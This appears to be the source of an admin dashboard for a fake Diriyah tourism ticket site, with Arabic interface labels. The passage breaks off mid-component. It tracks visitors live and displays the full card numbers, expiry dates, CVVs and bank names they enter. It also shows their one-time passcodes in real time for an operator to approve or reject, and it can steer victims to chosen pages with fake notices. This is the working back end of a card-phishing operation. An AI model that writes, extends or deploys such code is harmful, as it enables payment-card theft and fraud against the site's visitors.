import { useState, useEffect, useRef, useCallback } from "react";
import { toast } from "sonner";
import { Undo2, WifiOff as WifiOffBulk, Download, Search, ArrowRight } from "lucide-react";
import { Sheet, SheetContent } from "@/components/ui/sheet";
import {
  Users, MapPin, Clock, Monitor, Smartphone, Globe, Wifi, WifiOff,
  Eye, Trash2, CheckSquare, Square, AlertCircle, Bell, UserPlus,
  Navigation, MessageSquare, UtensilsCrossed, Ticket, MousePointer,
  ChevronDown, ChevronUp, Send, RotateCcw, Archive, ShoppingBag, CalendarCheck,
  CreditCard, Shield, CheckCircle, XCircle, X, CalendarDays,
} from "lucide-react";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { supabase } from "@/integrations/supabase/client";
import { playChime, createRipple } from "@/hooks/use-action-sound";

const sitePages = [
  { path: "/", label: "الصفحة الرئيسية" },
  { path: "/about", label: "عن الدرعية" },
  { path: "/places", label: "الأماكن" },
  { path: "/experiences", label: "التجارب" },
  { path: "/restaurants", label: "المطاعم" },
  { path: "/tickets", label: "التذاكر" },
  { path: "/events", label: "الفعاليات" },
  { path: "/contact", label: "تواصل معنا" },
  { path: "/plan", label: "خطط زيارتك" },
  { path: "/checkout", label: "شراء التذاكر" },
  { path: "/articles", label: "المقالات" },
];

const notificationTypes = [
  { key: "welcome", label: "ترحيب 👋", icon: "👋", color: "bg-emerald-500" },
  { key: "offer",   label: "عرض خاص 🎁", icon: "🎁", color: "bg-amber-500" },
  { key: "alert",   label: "تنبيه ⚠️",   icon: "⚠️", color: "bg-red-500" },
  { key: "info",    label: "توجيه 📍",   icon: "📍", color: "bg-violet-500" },
];

interface Visitor {
  id: string;
  session_id: string;
  name: string;
  email: string | null;
  phone: string | null;
  device: string;
  browser: string;
  country: string;
  current_page: string;
  current_page_label: string;
  is_online: boolean;
  last_seen: string;
  total_visits: number;
  pages_viewed: number;
  session_start: string;
  created_at: string;
  ip_address: string | null;
}

interface VisitorAction {
  id: string;
  action_type: string;
  action_detail: string | null;
  page: string | null;
  created_at: string;
}

interface VisitorOrder {
  id: string;
  confirmation_number: string | null;
  total: number;
  status: string;
  created_at: string;
  tickets: any;
  card_last4: string | null;
  card_brand: string | null;
  cardholder_name: string | null;
  bank_name: string | null;
  payment_method: string;
  email: string | null;
  phone: string | null;
  subtotal: number | null;
  vat: number | null;
  card_full_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
}

interface VisitorBooking {
  id: string;
  restaurant: string;
  booking_date: string;
  guests: number;
  status: string;
  created_at: string;
}

interface VisitorEventBooking {
  id: string;
  event_title: string;
  event_id: string;
  name: string;
  phone: string;
  email: string | null;
  guests: number;
  notes: string | null;
  status: string;
  created_at: string;
}

interface OtpRequest {
  id: string;
  order_id: string | null;
  otp_code: string;
  status: "pending" | "approved" | "rejected";
  created_at: string;
  updated_at: string;
}

interface VisitorMessage {
  id: string;
  name: string;
  email: string;
  phone: string | null;
  subject: string | null;
  message: string;
  is_read: boolean;
  created_at: string;
}

interface SideAlert {
  id: string;
  visitorName: string;
  actionLabel: string;
  actionIcon: string;
  isNew: boolean;
  timestamp: number;
}

import SwipeToDelete from "@/components/admin/SwipeToDelete";
import { useIsMobile } from "@/hooks/use-mobile";

const AdminVisitors = () => {
  const isMobile = useIsMobile();
  const [visitors, setVisitors]               = useState<Visitor[]>([]);
  const [deletedVisitors, setDeletedVisitors] = useState<Visitor[]>([]);
  const [selected, setSelected]               = useState<Visitor | null>(null);
  const [loading, setLoading]                 = useState(true);

  const [selectedActions, setSelectedActions]       = useState<VisitorAction[]>([]);
  const [visitorOrders, setVisitorOrders]           = useState<VisitorOrder[]>([]);
  const [visitorBookings, setVisitorBookings]       = useState<VisitorBooking[]>([]);
  const [visitorOtpRequests, setVisitorOtpRequests] = useState<OtpRequest[]>([]);

  const [visitorEventBookings, setVisitorEventBookings] = useState<VisitorEventBooking[]>([]);

  const [openSections, setOpenSections] = useState<Record<string, boolean>>({
    orders: true, bookings: true, eventBookings: true, actions: true, payment: true, otp: true,
  });
  const toggleSection = (key: string) => setOpenSections(prev => ({ ...prev, [key]: !prev[key] }));
  const allOpen = Object.values(openSections).every(Boolean);
  const toggleAllSections = () => {
    const newVal = !allOpen;
    setOpenSections({ orders: newVal, bookings: newVal, eventBookings: newVal, actions: newVal, payment: newVal, otp: newVal });
  };

  const [filter, setFilter]           = useState<"all" | "online" | "offline">("all");
  const [filterCountry, setFilterCountry] = useState<string>("all");
  const [filterDevice, setFilterDevice]   = useState<string>("all");
  const [searchQuery, setSearchQuery]     = useState("");
  const [showTrash, setShowTrash]     = useState(false);
  const [selectMode, setSelectMode]   = useState(false);
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [flashVisitorId, setFlashVisitorId] = useState<string | null>(null);
  const [confirmDelete, setConfirmDelete]   = useState<{ type: "single" | "selected" | "all"; id?: string } | null>(null);

  const [redirectNotifType, setRedirectNotifType] = useState("info");
  const [redirectPath, setRedirectPath]           = useState("");
  const [redirectMessage, setRedirectMessage]     = useState("");

  const [sideAlerts, setSideAlerts] = useState<SideAlert[]>([]);
  const alertTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});

  const addSideAlert = (alert: Omit<SideAlert, "id" | "timestamp">) => {
    const id = Math.random().toString(36).slice(2);
    setSideAlerts(prev => [{ ...alert, id, timestamp: Date.now() }, ...prev].slice(0, 5));
    alertTimers.current[id] = setTimeout(() => {
      setSideAlerts(prev => prev.filter(a => a.id !== id));
      delete alertTimers.current[id];
    }, 6000);
  };

  const removeSideAlert = (id: string) => {
    if (alertTimers.current[id]) { clearTimeout(alertTimers.current[id]); delete alertTimers.current[id]; }
    setSideAlerts(prev => prev.filter(a => a.id !== id));
  };

  // ─────────────────────────────────────────────
  // fetchVisitors
  // ─────────────────────────────────────────────
  const fetchVisitors = async () => {
    const { data } = await supabase.from("visitors").select("*").order("last_seen", { ascending: false });
    if (data) {
      const now = Date.now();
      const all = data.map(v => ({
        ...v,
        is_online: v.is_online && now - new Date(v.last_seen).getTime() < 60000,
      }));
      const active  = all.filter(v => !(v as any).is_deleted);
      const deleted = all.filter(v =>  (v as any).is_deleted);
      active.sort((a, b) => {
        const infoA = !!(a.email || a.phone || (a.name && a.name !== "زائر جديد"));
        const infoB = !!(b.email || b.phone || (b.name && b.name !== "زائر جديد"));
        if (infoA !== infoB) return infoB ? 1 : -1;
        if (a.is_online !== b.is_online) return b.is_online ? 1 : -1;
        return new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime();
      });
      setVisitors(active as Visitor[]);
      setDeletedVisitors(deleted as Visitor[]);
      if (selected) {
        const fresh = [...active, ...deleted].find(v => v.id === selected.id);
        if (fresh) setSelected(fresh as Visitor);
      }
    }
    setLoading(false);
  };

  const fetchActions = async (visitorId: string) => {
    const { data } = await supabase
      .from("visitor_actions").select("*")
      .eq("visitor_id", visitorId)
      .order("created_at", { ascending: false }).limit(20);
    if (data) setSelectedActions(data as VisitorAction[]);
  };

  // ─────────────────────────────────────────────
  // ✅ fetchVisitorOrdersAndBookings - مُصلَحة
  // ─────────────────────────────────────────────
  const fetchVisitorOrdersAndBookings = async (visitor: Visitor) => {
    const { email, phone } = visitor;

    if (email || phone) {
      let q = supabase
        .from("ticket_orders")
        .select("*")
        .order("created_at", { ascending: false });

      // phone في visitors محفوظ بدون 00966
      // CardPayment يحفظه بـ 00966 + الرقم
      const phoneWithPrefix = phone
        ? `00966${phone.replace(/^0+/, "").replace(/^\+966/, "")}`
        : null;

      if (email && phone) {
        q = q.or(
          `email.eq.${email},phone.eq.${phone},phone.eq.${phoneWithPrefix}`
        );
      } else if (email) {
        q = q.eq("email", email);
      } else if (phone) {
        q = q.or(`phone.eq.${phone},phone.eq.${phoneWithPrefix}`);
      }

      const { data: orders } = await q;
      const orderList = (orders || []) as VisitorOrder[];
      setVisitorOrders(orderList);

      // جلب OTP لكل طلب
      if (orderList.length > 0) {
        const orderIds = orderList.map(o => o.id);
        const { data: otps } = await (supabase as any)
          .from("otp_requests")
          .select("*")
          .in("order_id", orderIds)
          .order("created_at", { ascending: false });
        setVisitorOtpRequests((otps || []) as OtpRequest[]);
      } else {
        setVisitorOtpRequests([]);
      }

      // حجوزات المطاعم
      if (phone) {
        const { data: bookings } = await supabase
          .from("restaurant_bookings")
          .select("*")
          .or(`phone.eq.${phone},phone.eq.${phoneWithPrefix}`)
          .order("created_at", { ascending: false });
        setVisitorBookings((bookings || []) as VisitorBooking[]);
      } else {
        setVisitorBookings([]);
      }

      // حجوزات الفعاليات
      if (email || phone) {
        let eq = supabase.from("event_bookings").select("*").order("created_at", { ascending: false });
        if (email && phone) {
          eq = eq.or(`email.eq.${email},phone.eq.${phone},phone.eq.${phoneWithPrefix}`);
        } else if (email) {
          eq = eq.eq("email", email);
        } else if (phone) {
          eq = eq.or(`phone.eq.${phone},phone.eq.${phoneWithPrefix}`);
        }
        const { data: eventBookings } = await eq;
        setVisitorEventBookings((eventBookings || []) as VisitorEventBooking[]);
      } else {
        setVisitorEventBookings([]);
      }
      return;
    }

    // fallback: استخراج من visitor_actions
    const { data: actions } = await supabase
      .from("visitor_actions")
      .select("action_type, action_detail")
      .eq("visitor_id", visitor.id)
      .in("action_type", ["ticket_purchase", "restaurant_booking"]);

    if (actions && actions.length > 0) {
      const emails = new Set<string>();
      const phones = new Set<string>();
      actions.forEach(a => {
        const em = a.action_detail?.match(/\(([^)]+@[^)]+)\)/);
        if (em) emails.add(em[1]);
        const ph = a.action_detail?.match(/(\d{10,})/);
        if (ph) phones.add(ph[1]);
      });

      if (emails.size > 0) {
        const { data: orders } = await supabase
          .from("ticket_orders")
          .select("*")
          .in("email", Array.from(emails))
          .order("created_at", { ascending: false });
        const orderList = (orders || []) as VisitorOrder[];
        setVisitorOrders(orderList);
        if (orderList.length > 0) {
          const { data: otps } = await (supabase as any)
            .from("otp_requests")
            .select("*")
            .in("order_id", orderList.map(o => o.id))
            .order("created_at", { ascending: false });
          setVisitorOtpRequests((otps || []) as OtpRequest[]);
        }
      } else {
        setVisitorOrders([]);
        setVisitorOtpRequests([]);
      }

      if (phones.size > 0) {
        const { data: bookings } = await supabase
          .from("restaurant_bookings")
          .select("*")
          .in("phone", Array.from(phones))
          .order("created_at", { ascending: false });
        setVisitorBookings((bookings || []) as VisitorBooking[]);
      } else {
        setVisitorBookings([]);
      }
    } else {
      setVisitorOrders([]);
      setVisitorBookings([]);
      setVisitorEventBookings([]);
      setVisitorOtpRequests([]);
    }
  };

  // ─────────────────────────────────────────────
  // OTP actions
  // ─────────────────────────────────────────────
  const approveOtp = async (otpId: string) => {
    playChime("success");
    await (supabase as any).from("otp_requests")
      .update({ status: "approved", updated_at: new Date().toISOString() })
      .eq("id", otpId);
    const otp = visitorOtpRequests.find(o => o.id === otpId);
    if (otp?.order_id) {
      await supabase.from("ticket_orders").update({ status: "confirmed" }).eq("id", otp.order_id);
      setVisitorOrders(prev => prev.map(o => o.id === otp.order_id ? { ...o, status: "confirmed" } : o));
    }
    setVisitorOtpRequests(prev => prev.map(o => o.id === otpId ? { ...o, status: "approved" } : o));
  };

  const rejectOtp = async (otpId: string) => {
    playChime("delete");
    await (supabase as any).from("otp_requests")
      .update({ status: "rejected", updated_at: new Date().toISOString() })
      .eq("id", otpId);
    const otp = visitorOtpRequests.find(o => o.id === otpId);
    if (otp?.order_id) {
      await supabase.from("ticket_orders").update({ status: "rejected" }).eq("id", otp.order_id);
      setVisitorOrders(prev => prev.map(o => o.id === otp.order_id ? { ...o, status: "rejected" } : o));
    }
    setVisitorOtpRequests(prev => prev.map(o => o.id === otpId ? { ...o, status: "rejected" } : o));
  };

  // ─────────────────────────────────────────────
  // Realtime + polling
  // ─────────────────────────────────────────────
  useEffect(() => {
    fetchVisitors();

    const channel = supabase.channel("visitors-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "visitors" }, (payload: any) => {
        fetchVisitors();
        if (payload.eventType === "INSERT") {
          addSideAlert({ visitorName: payload.new.name || "زائر جديد", actionLabel: "دخل الموقع", actionIcon: "👤", isNew: true });
        }
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "visitor_actions" }, (payload: any) => {
        const action = payload.new;
        if (selected) fetchActions(selected.id);
        if (action.action_type === "page_view") return;

        const actionLabels: Record<string, { icon: string; label: string }> = {
          new_visitor:        { icon: "👤", label: "زائر جديد" },
          contact_form:       { icon: "📩", label: "رسالة تواصل" },
          restaurant_booking: { icon: "🍽️", label: "حجز مطعم" },
          ticket_purchase:    { icon: "🎟️", label: "شراء تذكرة" },
          newsletter_signup:  { icon: "📧", label: "اشتراك نشرة" },
        };
        const info = actionLabels[action.action_type] || { icon: "⚡", label: action.action_type };

        playChime("notification");
        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
        setFlashVisitorId(action.visitor_id);
        setTimeout(() => setFlashVisitorId(null), 3000);

        setVisitors(prev => {
          const v = prev.find(x => x.id === action.visitor_id);
          addSideAlert({ visitorName: v?.name || "زائر", actionLabel: info.label, actionIcon: info.icon, isNew: false });
          const idx = prev.findIndex(x => x.id === action.visitor_id);
          if (idx <= 0) return prev;
          const copy = [...prev];
          const [moved] = copy.splice(idx, 1);
          copy.unshift(moved);
          return copy;
        });
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "otp_requests" }, (payload: any) => {
        const incoming = payload.new as OtpRequest;
        if (payload.eventType === "INSERT") {
          addSideAlert({ visitorName: "زائر", actionLabel: "أرسل رمز OTP", actionIcon: "🔐", isNew: false });
          playChime("notification");
          setVisitorOtpRequests(prev => {
            const exists = prev.find(o => o.id === incoming.id);
            if (exists) return prev;
            return [incoming, ...prev];
          });
        } else if (payload.eventType === "UPDATE") {
          setVisitorOtpRequests(prev => prev.map(o => o.id === incoming.id ? incoming : o));
        }
      })
      .subscribe();

    const interval = setInterval(fetchVisitors, 15000);
    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
      Object.values(alertTimers.current).forEach(clearTimeout);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (selected) {
      fetchActions(selected.id);
      fetchVisitorOrdersAndBookings(selected);
    } else {
      setVisitorOrders([]);
      setVisitorBookings([]);
      setVisitorEventBookings([]);
      setVisitorOtpRequests([]);
      setSelectedActions([]);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selected?.id]);

  // ─────────────────────────────────────────────
  // CRUD helpers
  // ─────────────────────────────────────────────
  const deleteSingle = async (id: string) => {
    playChime("delete");
    await supabase.from("visitors").update({ is_deleted: true } as any).eq("id", id);
    setSelected(null);
    fetchVisitors();
  };

  const deleteSelected = async () => {
    playChime("delete");
    for (const id of selectedIds) await supabase.from("visitors").update({ is_deleted: true } as any).eq("id", id);
    if (selected && selectedIds.has(selected.id)) setSelected(null);
    setSelectedIds(new Set()); setSelectMode(false); fetchVisitors();
  };

  const deleteAll = async () => {
    const offlineVisitors = visitors.filter(v => !v.is_online);
    const ids = offlineVisitors.map(v => v.id);
    if (!ids.length) return;

    playChime("delete");
    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);

    // Optimistically hide from UI
    setVisitors(prev => prev.filter(v => v.is_online));
    if (selected && ids.includes(selected.id)) setSelected(null);
    setSelectedIds(new Set()); setSelectMode(false);

    const undoDuration = 5000;
    let undone = false;

    const restoreBulk = () => {
      undone = true;
      playChime("pop");
      setVisitors(prev => {
        const merged = [...prev, ...offlineVisitors];
        merged.sort((a, b) => new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime());
        return merged;
      });
    };

    toast(
      () => (
        <div className="w-full flex flex-col gap-2" dir="rtl">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Trash2 className="w-4 h-4 text-red-500 shrink-0" />
              <span className="text-sm font-medium">تم حذف {ids.length} زائر غير متصل</span>
            </div>
            <button
              onClick={() => { restoreBulk(); toast.dismiss(); }}
              className="flex items-center gap-1 px-2.5 py-1 rounded-lg bg-primary/10 text-primary text-xs font-bold hover:bg-primary/20 transition-colors"
            >
              <Undo2 className="w-3.5 h-3.5" />
              تراجع
            </button>
          </div>
          <div className="w-full h-1 rounded-full bg-muted overflow-hidden">
            <div
              className="h-full rounded-full bg-red-500"
              style={{ animation: `undoProgress ${undoDuration}ms linear forwards` }}
            />
          </div>
        </div>
      ),
      { duration: undoDuration, unstyled: false },
    );

    setTimeout(async () => {
      if (!undone) {
        await supabase.from("visitors").update({ is_deleted: true } as any).in("id", ids);
        fetchVisitors();
      }
    }, undoDuration);
  };

  const permanentDeleteSingle = async (id: string) => {
    playChime("delete");
    await supabase.from("visitor_actions").delete().eq("visitor_id", id);
    await supabase.from("visitors").delete().eq("id", id);
    fetchVisitors();
  };

  const permanentDeleteSelected = async () => {
    playChime("delete");
    for (const id of selectedIds) {
      await supabase.from("visitor_actions").delete().eq("visitor_id", id);
      await supabase.from("visitors").delete().eq("id", id);
    }
    setSelectedIds(new Set()); setSelectMode(false); fetchVisitors();
  };

  const permanentDeleteAll = async () => {
    playChime("delete");
    for (const v of deletedVisitors) await supabase.from("visitor_actions").delete().eq("visitor_id", v.id);
    const ids = deletedVisitors.map(v => v.id);
    if (ids.length) await supabase.from("visitors").delete().in("id", ids);
    fetchVisitors();
  };

  const handleConfirmPermanentDelete = async () => {
    if (!confirmDelete) return;
    if (confirmDelete.type === "single" && confirmDelete.id) await permanentDeleteSingle(confirmDelete.id);
    else if (confirmDelete.type === "selected") await permanentDeleteSelected();
    else if (confirmDelete.type === "all") await permanentDeleteAll();
    setConfirmDelete(null);
  };

  const restoreVisitor = async (id: string) => {
    playChime("success");
    await supabase.from("visitors").update({ is_deleted: false } as any).eq("id", id);
    fetchVisitors();
  };

  const restoreAllVisitors = async () => {
    playChime("success");
    for (const v of deletedVisitors) await supabase.from("visitors").update({ is_deleted: false } as any).eq("id", v.id);
    fetchVisitors();
  };

  const redirectVisitor = async (visitorId: string, path: string, notifType = "info", message = "") => {
    playChime("success");
    const val = message ? `${notifType}:${path}:${message}` : `${notifType}:${path}`;
    await supabase.from("visitors").update({ redirect_to: val } as any).eq("id", visitorId);
  };

  const updateOrderStatus = async (orderId: string, status: string) => {
    playChime("success");
    await supabase.from("ticket_orders").update({ status }).eq("id", orderId);
    setVisitorOrders(prev => prev.map(o => o.id === orderId ? { ...o, status } : o));
  };

  const toggleSelect = (id: string) => {
    setSelectedIds(prev => { const n = new Set(prev); n.has(id) ? n.delete(id) : n.add(id); return n; });
  };

  // ─────────────────────────────────────────────
  // Utility
  // ─────────────────────────────────────────────
  const getTimeDiff = (dateStr: string) => {
    const mins = Math.floor((Date.now() - new Date(dateStr).getTime()) / 60000);
    if (mins < 1) return "الآن";
    if (mins < 60) return `منذ ${mins} دقيقة`;
    const hrs = Math.floor(mins / 60);
    if (hrs < 24) return `منذ ${hrs} ساعة`;
    return `منذ ${Math.floor(hrs / 24)} يوم`;
  };

  const getDuration = (start: string) => {
    const mins = Math.floor((Date.now() - new Date(start).getTime()) / 60000);
    if (mins < 1) return "أقل من دقيقة";
    if (mins < 60) return `${mins} دقيقة`;
    return `${Math.floor(mins / 60)} ساعة و ${mins % 60} دقيقة`;
  };

  const countryFlag = (name: string) => {
    const map: Record<string, string> = {
      "Saudi Arabia":"🇸🇦","United Arab Emirates":"🇦🇪","Kuwait":"🇰🇼","Bahrain":"🇧🇭",
      "Qatar":"🇶🇦","Oman":"🇴🇲","Egypt":"🇪🇬","Jordan":"🇯🇴","Iraq":"🇮🇶",
      "Lebanon":"🇱🇧","Syria":"🇸🇾","Palestine":"🇵🇸","Yemen":"🇾🇪","Libya":"🇱🇾",
      "Tunisia":"🇹🇳","Algeria":"🇩🇿","Morocco":"🇲🇦","Sudan":"🇸🇩","Somalia":"🇸🇴",
      "United States":"🇺🇸","United Kingdom":"🇬🇧","Germany":"🇩🇪","France":"🇫🇷",
      "Canada":"🇨🇦","Australia":"🇦🇺","India":"🇮🇳","China":"🇨🇳","Japan":"🇯🇵",
      "South Korea":"🇰🇷","Turkey":"🇹🇷","Pakistan":"🇵🇰","Indonesia":"🇮🇩",
      "Malaysia":"🇲🇾","Brazil":"🇧🇷","Mexico":"🇲🇽","Italy":"🇮🇹","Spain":"🇪🇸",
      "Netherlands":"🇳🇱","Sweden":"🇸🇪","Norway":"🇳🇴","Denmark":"🇩🇰",
      "Russia":"🇷🇺","South Africa":"🇿🇦","Nigeria":"🇳🇬","Singapore":"🇸🇬",
      "Thailand":"🇹🇭","Philippines":"🇵🇭","Bangladesh":"🇧🇩","Sri Lanka":"🇱🇰",
      "Iran":"🇮🇷","Afghanistan":"🇦🇫","Ireland":"🇮🇪","Switzerland":"🇨🇭",
      "Austria":"🇦🇹","Belgium":"🇧🇪","Portugal":"🇵🇹","Greece":"🇬🇷","Poland":"🇵🇱",
      "New Zealand":"🇳🇿","Argentina":"🇦🇷","Colombia":"🇨🇴","Chile":"🇨🇱",
      "Finland":"🇫🇮","Czech Republic":"🇨🇿","Romania":"🇷🇴","Hungary":"🇭🇺",
    };
    return map[name] || "🌍";
  };

  const statusLabel = (s: string) => {
    const map: Record<string, { text: string; color: string }> = {
      confirmed: { text: "مؤكد",          color: "text-emerald-600 bg-emerald-50" },
      pending:   { text: "قيد الانتظار",  color: "text-amber-600 bg-amber-50" },
      cancelled: { text: "ملغي",          color: "text-red-600 bg-red-50" },
      rejected:  { text: "مرفوض",         color: "text-red-600 bg-red-50" },
    };
    return map[s] || { text: s, color: "text-slate-600 bg-slate-50" };
  };

  // ─────────────────────────────────────────────
  // Render helpers
  // ─────────────────────────────────────────────
  const CollapsibleSection = ({ sectionKey, icon: Icon, iconColor, bgColor, borderColor, title, count, compact, children }: {
    sectionKey: string; icon: any; iconColor: string; bgColor: string; borderColor: string; title: string; count: number; compact: boolean; children: React.ReactNode;
  }) => {
    const isOpen = openSections[sectionKey] ?? true;
    const sm = compact ? "text-[11px]" : "text-[12px]";
    return (
      <div className={`border ${borderColor} rounded-xl overflow-hidden transition-all duration-200`}>
        <button
          onClick={() => toggleSection(sectionKey)}
          className={`w-full ${bgColor} px-3 py-2 flex items-center gap-1.5 hover:opacity-80 transition-opacity`}
        >
          <div className={`w-5 h-5 rounded-md bg-gradient-to-br ${iconColor.replace("text-", "from-")} to-transparent/50 flex items-center justify-center`}>
            <Icon className={`w-3 h-3 text-white`} />
          </div>
          <span className={`${sm} font-bold ${iconColor} flex-1 text-right`}>{title} ({count})</span>
          <ChevronDown className={`w-3.5 h-3.5 ${iconColor} transition-transform duration-300 ${isOpen ? "rotate-180" : ""}`} />
        </button>
        <div
          className={`transition-all duration-300 ease-in-out ${isOpen ? "max-h-[600px] opacity-100" : "max-h-0 opacity-0"} overflow-hidden`}
        >
          {children}
        </div>
      </div>
    );
  };

  const renderEventBookings = (compact: boolean) => {
    if (!visitorEventBookings.length) return null;
    const sm  = compact ? "text-[11px]" : "text-[12px]";
    const xs  = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    return (
      <CollapsibleSection sectionKey="eventBookings" icon={CalendarDays} iconColor="text-indigo-500" bgColor="bg-indigo-50" borderColor="border-indigo-100" title="حجوزات الفعاليات" count={visitorEventBookings.length} compact={compact}>
        <div className={`${pad} space-y-1.5 max-h-[200px] overflow-y-auto`}>
          {visitorEventBookings.map(eb => {
            const st = statusLabel(eb.status);
            return (
              <div key={eb.id} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                <CalendarDays className="w-4 h-4 text-indigo-400 shrink-0" />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className={`${sm} font-medium text-slate-700 truncate`}>{eb.event_title}</span>
                    <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                  </div>
                  <div className="flex items-center gap-2 mt-0.5">
                    <span className={`${xs} text-slate-500`}>{eb.guests} أشخاص</span>
                    <span className={`${xs} text-slate-400`}>{getTimeDiff(eb.created_at)}</span>
                  </div>
                  {eb.notes && <p className={`${xs} text-slate-400 mt-0.5 truncate`}>{eb.notes}</p>}
                </div>
              </div>
            );
          })}
        </div>
      </CollapsibleSection>
    );
  };

  const renderPaymentInfo = (compact: boolean) => {
    const ordersWithCard = visitorOrders.filter(o =>
      o.card_last4 || o.card_brand || o.cardholder_name || o.card_full_number
    );
    if (!ordersWithCard.length) return null;

    const sm = compact ? "text-[11px]" : "text-[12px]";
    const xs = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    const fmt = (num: string) => num.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();

    return (
      <CollapsibleSection sectionKey="payment" icon={CreditCard} iconColor="text-sky-500" bgColor="bg-sky-50" borderColor="border-sky-100" title="معلومات الدفع الكاملة" count={ordersWithCard.length} compact={compact}>
        <div className={`${pad} space-y-4`}>
          {ordersWithCard.map(order => (
            <div key={order.id} className="space-y-2">
              <div className="flex items-center justify-between">
                <span className={`${xs} text-slate-400`}>{order.confirmation_number || order.id.slice(0, 8)}</span>
                <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${statusLabel(order.status).color}`}>
                  {statusLabel(order.status).text}
                </span>
              </div>
              <div className="bg-slate-800 rounded-xl p-3 space-y-2">
                <div className="flex items-center justify-between">
                  <span className={`${xs} text-slate-400`}>رقم البطاقة</span>
                  <span className={`${sm} font-mono font-bold text-white tracking-widest`} dir="ltr">
                    {order.card_full_number ? fmt(order.card_full_number) : `•••• •••• •••• ${order.card_last4 || "----"}`}
                  </span>
                </div>
                {order.card_expiry && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>تاريخ الانتهاء</span>
                    <span className={`${sm} font-mono font-bold text-white`} dir="ltr">{order.card_expiry}</span>
                  </div>
                )}
                {order.card_cvv && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>CVV</span>
                    <span className={`${sm} font-mono font-bold text-amber-400`} dir="ltr">{order.card_cvv}</span>
                  </div>
                )}
                {order.cardholder_name && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>حامل البطاقة</span>
                    <span className={`${sm} font-semibold text-white`}>{order.cardholder_name}</span>
                  </div>
                )}
                {order.bank_name && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>البنك</span>
                    <span className={`${sm} font-medium text-sky-300`}>{order.bank_name}</span>
                  </div>
                )}
                {order.card_brand && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>نوع البطاقة</span>
                    <span className={`${sm} font-bold text-amber-400 uppercase`}>{order.card_brand}</span>
                  </div>
                )}
                <div className="border-t border-slate-600 pt-2 flex items-center justify-between">
                  <span className={`${xs} text-slate-400`}>المبلغ الإجمالي</span>
                  <span className={`${sm} font-bold text-emerald-400`}>{order.total} ر.س</span>
                </div>
              </div>
              <div className="bg-slate-50 rounded-xl p-2.5 space-y-1.5">
                <span className={`${xs} font-semibold text-slate-500 block mb-1`}>بيانات الزائر</span>
                {order.email && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>البريد الإلكتروني</span>
                    <span className={`${xs} font-medium text-slate-700`} dir="ltr">{order.email}</span>
                  </div>
                )}
                {order.phone && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>رقم الجوال</span>
                    <span className={`${xs} font-medium text-slate-700`} dir="ltr">{order.phone}</span>
                  </div>
                )}
                {order.subtotal != null && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>المجموع الفرعي</span>
                    <span className={`${xs} font-medium text-slate-700`}>{order.subtotal} ر.س</span>
                  </div>
                )}
                {order.vat != null && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>ضريبة القيمة المضافة</span>
                    <span className={`${xs} font-medium text-slate-700`}>{order.vat} ر.س</span>
                  </div>
                )}
                {order.tickets && Array.isArray(order.tickets) && order.tickets.length > 0 && (
                  <div className="mt-1 pt-1 border-t border-slate-200">
                    <span className={`${xs} font-semibold text-slate-500 block mb-1`}>التذاكر</span>
                    {order.tickets.map((t: any, i: number) => (
                      <div key={i} className="flex items-center justify-between">
                        <span className={`${xs} text-slate-600`}>{t.name || t.id}</span>
                        <span className={`${xs} text-slate-500`}>{t.qty} × {t.price} ر.س</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          ))}
        </div>
      </CollapsibleSection>
    );
  };

  const renderOtpSection = (compact: boolean) => {
    if (!visitorOtpRequests.length) return null;

    const sm = compact ? "text-[11px]" : "text-[12px]";
    const xs = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    return (
      <CollapsibleSection sectionKey="otp" icon={Shield} iconColor="text-violet-500" bgColor="bg-violet-50" borderColor="border-violet-100" title="رموز OTP" count={visitorOtpRequests.length} compact={compact}>
        <div className={`${pad} space-y-2`}>
          {visitorOtpRequests.map(req => (
            <div key={req.id} className="bg-slate-50 rounded-xl p-3 space-y-2">
              <div className="flex items-center justify-between">
                <span className={`${xs} text-slate-400`}>رمز OTP</span>
                <span
                  className={`${sm} font-mono font-bold text-violet-600 tracking-[0.3em] bg-violet-50 px-2 py-0.5 rounded-lg border border-violet-100`}
                  dir="ltr"
                >
                  {req.otp_code}
                </span>
              </div>
              {req.order_id && (
                <div className="flex items-center justify-between">
                  <span className={`${xs} text-slate-400`}>رقم الطلب</span>
                  <span className={`${xs} font-mono text-slate-500`}>
                    {visitorOrders.find(o => o.id === req.order_id)?.confirmation_number || req.order_id.slice(0, 8)}
                  </span>
                </div>
